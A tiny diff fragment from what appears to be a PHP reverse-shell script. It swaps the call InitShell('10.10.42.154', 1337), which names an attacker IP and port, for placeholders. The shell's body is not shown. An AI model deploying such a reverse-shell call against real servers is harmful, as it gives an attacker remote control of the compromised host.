@@ -117,6 +117,6 @@ function InitShell(string $AttackerIp, int $AttackerPort): void
     die();
 }
 
-InitShell('10.10.42.154', 1337);
+InitShell('IP', PORT);
 
 ?>
